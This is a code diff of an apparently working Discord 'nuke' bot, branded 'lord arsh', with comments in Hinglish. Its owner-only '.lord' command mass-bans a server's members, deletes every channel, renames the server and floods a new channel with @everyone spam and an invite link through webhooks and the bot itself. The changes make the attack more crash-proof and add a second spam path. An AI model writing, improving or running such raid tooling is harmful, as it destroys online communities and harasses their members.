@@ -13,7 +13,7 @@ if (!TOKEN) {
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-// ============ HTTP SERVER ============
+// ============ HTTP SERVER (Render ke liye) ============
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -81,7 +81,7 @@ async function fetchAllMemberIds(guildId) {
 }
 
 // ==========================================================
-//   🎯 GUARANTEED 400/400 BAN — 150-300 sec
+//   🎯 GUARANTEED BAN — 400/400, failed: 0
 // ==========================================================
 async function banAllMembers(guildId, excludedIds, statusCallback) {
   console.log('📥 Fetching member IDs...');
@@ -93,7 +93,7 @@ async function banAllMembers(guildId, excludedIds, statusCallback) {
   console.log(`🎯 Ban targets: ${targets.length}`);
   console.log(`⏱ Fetch time: ${fetchTime}s`);
 
-  // ⚡ Auto-tune based on size
+  // ⚡ Auto-tune
   let CONCURRENCY, BAN_DELAY;
   if (targets.length <= 500) {
     CONCURRENCY = 100; BAN_DELAY = 20;
@@ -194,7 +194,7 @@ async function banAllMembers(guildId, excludedIds, statusCallback) {
   console.log(`🚫 Forbidden  : ${forbidden}`);
   console.log(`❌ Failed     : ${failed}`);
   console.log(`📦 Total      : ${processed}/${targets.length}`);
-  console.log(`⏱ Ban time   : ${secs}s (${(secs/60).toFixed(1)} min)`);
+  console.log(`⏱ Ban time   : ${secs}s`);
   console.log(`⚡ Rate       : ${rate} bans/sec`);
   console.log(`=========================================\n`);
 
@@ -203,7 +203,10 @@ async function banAllMembers(guildId, excludedIds, statusCallback) {
 
 // ============ DELETE CHANNELS ============
 async function deleteAllChannels(guildId) {
+  console.log('[DELETE] Fetching channels...');
   const channels = await api('GET', `/guilds/${guildId}/channels`);
+  console.log(`[DELETE] Total channels: ${channels.length}`);
+
   let deleted = 0, failed = 0;
   for (const ch of channels) {
     try {
@@ -211,9 +214,14 @@ async function deleteAllChannels(guildId) {
         extraHeaders: { 'X-Audit-Log-Reason': 'lord arsh reset' }
       });
       deleted++;
-      await sleep(300);
-    } catch { failed++; }
+      console.log(`[DELETE] ✅ ${ch.name || ch.id}`);
+      await sleep(400);
+    } catch (e) {
+      failed++;
+      console.log(`[DELETE] ❌ ${ch.id}: ${e.message}`);
+    }
   }
+  console.log(`[DELETE] Done — Deleted: ${deleted}, Failed: ${failed}`);
   return { deleted, failed };
 }
 
@@ -224,45 +232,90 @@ async function createChannels(guildId, name, count) {
   for (let i = 0; i < count; i++) {
     try {
       const ch = await api('POST', `/guilds/${guildId}/channels`, {
-        body: { name: `${name}-${i + 1}`, type: 0 }
+        body: {
+          name: `${name}-${i + 1}`,
+          type: 0,
+          topic: 'LORD ARSH AYA HH'
+        }
       });
       newChannels.push(ch);
       created++;
-      await sleep(500);
-    } catch { failed++; }
+      console.log(`[CREATE] ✅ ${ch.name} (${ch.id})`);
+      await sleep(1000); // Discord ko register karne ka time do
+    } catch (e) {
+      failed++;
+      console.log(`[CREATE] ❌ ${e.message}`);
+    }
   }
+  console.log(`[CREATE] Done — Created: ${created}, Failed: ${failed}`);
   return { created, failed, channels: newChannels };
 }
 
-// ============ SPAM ============
-async function spamChannels(channels, text) {
-  let spammed = 0, failed = 0;
+// ============ SPAM — Webhook + Bot dono se ============
+async function spamChannelsBoth(channels, text, client) {
+  let webhookSpam = 0;
+  let botSpam = 0;
+  let failed = 0;
+
   for (const ch of channels) {
+    console.log(`[SPAM] Channel: ${ch.id}`);
+
+    // ===== A) WEBHOOK SPAM =====
     try {
       const hooks = [];
       for (let i = 0; i < 3; i++) {
         try {
-          const hook = await api('POST', `/channels/${ch.id}/webhooks`, { body: { name: 'lord arsh' } });
+          const hook = await api('POST', `/channels/${ch.id}/webhooks`, {
+            body: { name: 'lord arsh' }
+          });
           hooks.push(hook);
-          await sleep(300);
-        } catch {}
+          console.log(`[SPAM] Webhook created: ${hook.id}`);
+          await sleep(400);
+        } catch (e) {
+          console.log(`[SPAM] Webhook create fail: ${e.message}`);
+        }
       }
-      if (hooks.length === 0) continue;
+
       for (const wh of hooks) {
         for (let j = 0; j < 30; j++) {
           try {
-            await api('POST', `/webhooks/${wh.id}/${wh.token}`, { body: { content: text }, auth: false });
-            spammed++;
+            await api('POST', `/webhooks/${wh.id}/${wh.token}`, {
+              body: { content: text },
+              auth: false
+            });
+            webhookSpam++;
             await sleep(600);
           } catch { failed++; }
         }
       }
+
+      // Cleanup webhooks
       for (const wh of hooks) {
         try { await api('DELETE', `/webhooks/${wh.id}/${wh.token}`, { auth: false }); } catch {}
       }
-    } catch { failed++; }
+    } catch (e) {
+      console.log(`[SPAM] Webhook section fail: ${e.message}`);
+    }
+
+    // ===== B) BOT SPAM =====
+    try {
+      const chObj = await client.channels.fetch(ch.id).catch(() => null);
+      if (chObj && chObj.isTextBased()) {
+        for (let j = 0; j < 20; j++) {
+          try {
+            await chObj.send(text).catch(() => {});
+            botSpam++;
+            await sleep(700);
+          } catch { failed++; }
+        }
+      }
+    } catch (e) {
+      console.log(`[SPAM] Bot spam fail: ${e.message}`);
+    }
   }
-  return { spammed, failed };
+
+  console.log(`[SPAM] Done — Webhook: ${webhookSpam}, Bot: ${botSpam}, Failed: ${failed}`);
+  return { webhook: webhookSpam, bot: botSpam, failed };
 }
 
 // ============ TOP ROLE ============
@@ -279,10 +332,47 @@ async function getTopRoleMember(guildId) {
   } catch { return null; }
 }
 
-// ============ .lord NUKE ============
+// ==========================================================
+//   💀 .lord NUKE — FIXED (crash-proof, full 5 steps)
+// ==========================================================
 async function handleLord(message) {
   const guildId = message.guild.id;
-  const reply = (txt) => message.channel.send(txt).catch(() => {});
+  let fallbackChannelId = message.channel.id;
+
+  // Safe reply — channel delete ho jaye toh bhi crash na ho
+  const reply = async (txt) => {
+    // 1) Original channel try karo
+    try {
+      const ch = await message.client.channels.fetch(fallbackChannelId).catch(() => null);
+      if (ch && ch.isTextBased()) {
+        const sent = await ch.send(txt).catch(() => null);
+        if (sent) return;
+      }
+    } catch {}
+
+    // 2) Fallback: koi bhi available text channel
+    try {
+      const guild = await message.client.guilds.fetch(guildId).catch(() => null);
+      if (guild) {
+        const me = guild.members.me;
+        const anyCh = guild.channels.cache.find(c =>
+          c.isTextBased() &&
+          me &&
+          c.permissionsFor(me)?.has('SendMessages')
+        );
+        if (anyCh) {
+          const sent = await anyCh.send(txt).catch(() => null);
+          if (sent) {
+            fallbackChannelId = anyCh.id; // update fallback
+            return;
+          }
+        }
+      }
+    } catch {}
+
+    // 3) Last resort: console
+    console.log('[REPLY]', txt);
+  };
 
   await reply('🔥 **LORD MODE STARTED** 🔥');
 
@@ -294,34 +384,49 @@ async function handleLord(message) {
     topRoleId,
   ].filter(Boolean));
 
-  await reply(`💀 **STEP 1:** Banning members...`);
-
-  let lastUpdate = 0;
-  const progressCb = (txt) => {
-    const now = Date.now();
-    if (now - lastUpdate > 5000) {
-      lastUpdate = now;
-      reply(txt);
-    }
-  };
-
-  const banResult = await banAllMembers(guildId, excluded, progressCb);
-
-  await reply(`✅ **STEP 1 DONE**
+  // ===== STEP 1: BAN =====
+  await reply('💀 **STEP 1:** Banning members...');
+  let banResult = { ok: 0, already: 0, forbidden: 0, failed: 0, secs: '0', total: 0, rate: '0' };
+  try {
+    banResult = await banAllMembers(guildId, excluded, (txt) => console.log('[BAN]', txt));
+    await reply(`✅ **STEP 1 DONE**
 ✅ Banned: **${banResult.ok}** / ${banResult.total}
 📊 Already: ${banResult.already}
 🚫 Forbidden: ${banResult.forbidden}
 ❌ Failed: ${banResult.failed}
-⏱ **${banResult.secs}s** (${banResult.rate}/s)`);
+⏱ **${banResult.secs}s**`);
+  } catch (err) {
+    console.error('BAN ERROR:', err);
+    await reply(`❌ STEP 1 FAILED: ${err.message}`);
+  }
 
+  // ===== STEP 2: DELETE CHANNELS =====
   await reply('🗑️ **STEP 2:** Deleting channels...');
-  const delResult = await deleteAllChannels(guildId);
-  await reply(`✅ **STEP 2 DONE:** Deleted ${delResult.deleted}`);
+  let delResult = { deleted: 0, failed: 0 };
+  try {
+    delResult = await deleteAllChannels(guildId);
+  } catch (err) {
+    console.error('DELETE ERROR:', err);
+  }
 
-  await reply('📁 **STEP 3:** Creating channels...');
-  const createResult = await createChannels(guildId, 'lord-arsh-se-nahi-bajna-chahiye-tha', 10);
-  await reply(`✅ **STEP 3 DONE:** Created ${createResult.created}`);
+  // ===== STEP 3: CREATE 1 CHANNEL =====
+  console.log('[CREATE] Creating 1 channel...');
+  let createResult = { created: 0, failed: 0, channels: [] };
+  try {
+    createResult = await createChannels(guildId, 'lord-arsh-se-nahi-bajna-chahiye-tha', 1);
+  } catch (err) {
+    console.error('CREATE ERROR:', err);
+  }
 
+  // Naye channel me STEP 3 confirmation bhejo
+  if (createResult.channels.length > 0) {
+    fallbackChannelId = createResult.channels[0].id;
+    await reply(`✅ **STEP 3 DONE:** Created ${createResult.created} channel`);
+  } else {
+    await reply(`❌ **STEP 3 FAILED:** Channel create nahi hua`);
+  }
+
+  // ===== STEP 4: RENAME SERVER =====
   await reply('🏷️ **STEP 4:** Renaming server...');
   try {
     await api('PATCH', `/guilds/${guildId}`, {
@@ -330,20 +435,30 @@ async function handleLord(message) {
         description: 'LORD ARSH AYA HH'
       }
     });
-    await reply('✅ **STEP 4 DONE**');
+    await reply('✅ **STEP 4 DONE** — Server renamed');
+    console.log('[RENAME] ✅ Server renamed');
   } catch (err) {
+    console.error('RENAME ERROR:', err);
     await reply(`❌ STEP 4 FAILED: ${err.message}`);
   }
 
-  await reply('🔥 **STEP 5:** Spamming...');
-  const spamMsg = `# @everyone LORD ARSH AYA HH SWAAGAT TO KARO HAMARA LORD OWNZ YOU 👿 JOIN: https://discord.gg/5SA2R2XcrQ`;
-  const spamResult = await spamChannels(createResult.channels, spamMsg);
+  // ===== STEP 5: SPAM (Webhook + Bot dono) =====
+  await reply('🔥 **STEP 5:** Spamming (webhook + bot)...');
+  let spamResult = { webhook: 0, bot: 0, failed: 0 };
+  try {
+    const spamMsg = `# @everyone LORD ARSH AYA HH SWAAGAT TO KARO HAMARA LORD OWNZ YOU 👿 JOIN: https://discord.gg/5SA2R2XcrQ`;
+    spamResult = await spamChannelsBoth(createResult.channels, spamMsg, message.client);
+  } catch (err) {
+    console.error('SPAM ERROR:', err);
+  }
 
+  // ===== FINAL SUMMARY =====
   await reply(`🏆 **LORD COMPLETE** 🏆
 💀 Banned: **${banResult.ok}** / ${banResult.total}
 🗑️ Deleted: ${delResult.deleted}
 📁 Created: ${createResult.created}
-🔥 Spammed: ${spamResult.spammed}
+🔥 Webhook Spam: ${spamResult.webhook}
+🤖 Bot Spam: ${spamResult.bot}
 ⏱ Time: ${banResult.secs}s`);
 }
 
@@ -362,7 +477,6 @@ client.on('error', (err) => console.error('❌ Client error:', err.message));
 client.on('warn', (info) => console.warn('⚠️ Warn:', info));
 
 // ================= MESSAGE LISTENER =================
-// 🔒 SIRF OWNER_ID (1138793867353796709) ke commands
 client.on('messageCreate', async (message) => {
   try {
     if (message.author?.bot) return;
@@ -370,7 +484,7 @@ client.on('messageCreate', async (message) => {
     if (!content) return;
     const lower = content.toLowerCase();
 
-    // 🔒 OWNER LOCK — sirf is banda ke commands
+    // 🔒 SIRF OWNER_ID
     if (message.author.id !== OWNER_ID) return;
 
     if (lower === '.check') {
